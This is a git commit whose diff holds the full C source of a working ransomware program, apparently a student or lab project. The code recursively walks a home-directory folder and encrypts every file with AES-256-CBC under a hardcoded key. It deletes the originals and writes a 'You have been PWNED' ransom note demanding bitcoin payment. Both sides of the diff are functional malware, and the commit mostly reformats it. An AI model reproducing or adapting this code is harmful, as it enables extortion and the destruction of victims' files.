fdf80a311d8f8565722f5338ab3f71f08a3d9fb0
Lee Yang Jae <yayaja11@naver.com>
2016-11-28 22:52:58 +0900

    [encrypt] Modify Finding path
    Signed-off-by: Lee Yang Jae <yayaja11@naver.com>

--- encrypt.c
+++ encrypt.c
@@ -9,135 +9,134 @@
 #include <openssl/aes.h>
 
 void ls_dir(char* start_path);
-void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
+void encryptfile(FILE * fpin, FILE* fpout, unsigned char* key, unsigned char* iv);
 
 int main()
 {
-    
-    char* start_path;
-    char* home;
-    char* uid;
-    uid_t user_id;
-    struct passwd *lpwd;
+	char* start_path;
+	char* home;
+	char* uid;
+	uid_t user_id;
+	struct passwd *lpwd;
 
-    //printf("EUID   : %d\n" ,geteuid());
-    //GETEUID()_effective user Identification
-    lpwd = getpwuid(geteuid());
-    //printf("EUNAME : %s\n", lpwd->pw_name);
-    
-    home = "/home/";
-    start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
-    strcpy(start_path, home);
-    strcat(start_path, lpwd->pw_name);
-    strcat(start_path, "/Desktop/ransomware/");
-    printf("%s", start_path);
-    
-    ls_dir(start_path);
-    
-    return 0;
+	//printf("EUID   : %d\n" ,geteuid());
+	//GETEUID()_effective user Identification
+	lpwd = getpwuid(geteuid());
+	//printf("EUNAME : %s\n", lpwd->pw_name);
+
+	home = "/home/";
+	start_path = (char*)malloc(strlen(home) + strlen(lpwd->pw_name) + strlen("/Desktop/ransomware/") + 2);
+	strcpy(start_path, home);
+	strcat(start_path, lpwd->pw_name);
+	strcat(start_path, "/Desktop/ransomware/");
+	printf("%s", start_path);
+	ls_dir(start_path);
+
+	return 0;
 }
 
 void ls_dir(char* start_path)
 {
-    unsigned char key[] = "12345678901234561234567890123456";
-    unsigned char iv[] = "1234567890123456";
-    DIR* dir;
-    struct dirent *ent;
-    if((dir=opendir(start_path)) !=NULL)
-    {
-        while((ent=readdir(dir)) !=NULL)
-        {
-            int len = strlen(ent->d_name);
-            const char* last_four = &ent->d_name[len-4];
-            if(strcmp(last_four,".enc") != 0)
-            {
-                if(ent->d_type == 8)
-                {
-                    char* full_path_readme =(char*) malloc(strlen("RANSOMWARE_INFO.txt")+strlen(start_path)+2);
-                    strcpy(full_path_readme,start_path);
-                    strcat(full_path_readme,"RANSOMWARE_INFO.txt");
-                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
-                    strcpy(full_path,start_path);
-                    strcat(full_path,ent->d_name);
-                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);
-                    strcpy(new_name,full_path);
-                    strcat(new_name,".enc");
-                    
-                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
-                    {
-                        FILE* fpin;
-                        FILE* fpout;
-                        FILE* fpreadme;
-                        
-                        fpin=fopen(full_path,"rb");
-                        fpout=fopen(new_name,"wb");
-                        
-                        //ONLY ONE RANSOMWARE_INFO
-                        //start_path = current path
-                        //printf("%zu", strlen(start_path));  //35
-                        if (strlen(start_path)==35){
-                            fpreadme=fopen(full_path_readme,"w");
-                            fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
-                            fclose(fpreadme);
-                        }
-                        
-                        encryptfile(fpin,fpout,key,iv);
-                        
-                        fclose(fpin);
-                        fclose(fpout);
-                        
-                        remove(full_path);
-                    }
-                    free(full_path);
-                    free(new_name);
-                }
-                else if(ent->d_type==4)
-                {
-                    char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
-                    strcpy(full_path,start_path);
-                    strcat(full_path,ent->d_name);
-                    strcat(full_path,"/");
-                    printf("%s\n",full_path);
-                    if(full_path != start_path && ent->d_name[0] != '.')
-                    {
-                        ls_dir(full_path);
-                    }
-                    
-                    free(full_path);
-                }
-            }
-        }
-    }
+	unsigned char key[] = "12345678901234561234567890123456";
+	unsigned char iv[] = "1234567890123456";
+	DIR* dir;
+	struct passwd *lpwd = getpwuid(geteuid());
+	char *home = "/home/";
+	struct dirent *ent;
+	if ((dir = opendir(start_path)) != NULL)
+	{
+		while ((ent = readdir(dir)) != NULL)
+		{
+			int len = strlen(ent->d_name);
+			const char* last_four = &ent->d_name[len - 4];
+			if (strcmp(last_four, ".enc") != 0)
+			{
+				if (ent->d_type == 8)
+				{
+					char* full_path_readme = (char*)malloc(strlen("RANSOMWARE_INFO.txt") + strlen(start_path) + 2);
+					strcpy(full_path_readme, start_path);
+					strcat(full_path_readme, "RANSOMWARE_INFO.txt");
+					char* full_path = (char*)malloc(strlen(ent->d_name) + strlen(start_path) + 2);
+					strcpy(full_path, start_path);
+					strcat(full_path, ent->d_name);
+					char* new_name = (char*)malloc(strlen(full_path) + strlen(".enc") + 1);
+					strcpy(new_name, full_path);
+					strcat(new_name, ".enc");
+
+					if (strcmp(full_path, "/etc/passwd") != 0 && strcmp(full_path, "/etc/shadow") != 0 && strcmp(full_path, "/etc/sudoers") != 0)
+					{
+						FILE* fpin;
+						FILE* fpout;
+						FILE* fpreadme;
+
+						fpin = fopen(full_path, "rb");
+						fpout = fopen(new_name, "wb");
+
+						//ONLY ONE RANSOMWARE_INFO
+						//start_path = current path
+						if ((strlen(home) + strlen("/Desktop/ransomware/") + strlen(lpwd->pw_name)) == strlen(start_path)) {
+							fpreadme = fopen(full_path_readme, "w");
+							fprintf(fpreadme, "You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
+							fclose(fpreadme);
+						}
+
+						encryptfile(fpin, fpout, key, iv);
+
+						fclose(fpin);
+						fclose(fpout);
+
+						remove(full_path);
+					}
+					free(full_path);
+					free(new_name);
+				}
+				else if (ent->d_type == 4)
+				{
+					char *full_path = (char*)malloc(strlen(start_path) + strlen(ent->d_name) + 2);
+					strcpy(full_path, start_path);
+					strcat(full_path, ent->d_name);
+					strcat(full_path, "/");
+					printf("%s\n", full_path);
+					if (full_path != start_path && ent->d_name[0] != '.')
+					{
+						ls_dir(full_path);
+					}
+
+					free(full_path);
+				}
+			}
+		}
+	}
 }
 
-void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
+void encryptfile(FILE * fpin, FILE* fpout, unsigned char* key, unsigned char* iv)
 {
-    const unsigned bufsize = 4096;
-    unsigned char* read_buf = malloc(bufsize);
-    unsigned char* cipher_buf ;
-    unsigned blocksize;
-    int out_len;
-    
-    EVP_CIPHER_CTX ctx;
-    
-    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);
-    blocksize = EVP_CIPHER_CTX_block_size(&ctx);
-    cipher_buf = malloc(bufsize+blocksize);
-    
-    while(1)
-    {
-        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
-        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
-        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
-        if(bytes_read < bufsize)
-        {
-            break;
-        }
-    }
-    
-    EVP_CipherFinal(&ctx,cipher_buf,&out_len);
-    fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
-    
-    free(cipher_buf);
-    free(read_buf);
+	const unsigned bufsize = 4096;
+	unsigned char* read_buf = malloc(bufsize);
+	unsigned char* cipher_buf;
+	unsigned blocksize;
+	int out_len;
+
+	EVP_CIPHER_CTX ctx;
+
+	EVP_CipherInit(&ctx, EVP_aes_256_cbc(), key, iv, 1);
+	blocksize = EVP_CIPHER_CTX_block_size(&ctx);
+	cipher_buf = malloc(bufsize + blocksize);
+
+	while (1)
+	{
+		int bytes_read = fread(read_buf, sizeof(unsigned char), bufsize, fpin);
+		EVP_CipherUpdate(&ctx, cipher_buf, &out_len, read_buf, bytes_read);
+		fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);
+		if (bytes_read < bufsize)
+		{
+			break;
+		}
+	}
+
+	EVP_CipherFinal(&ctx, cipher_buf, &out_len);
+	fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);
+
+	free(cipher_buf);
+	free(read_buf);
 }
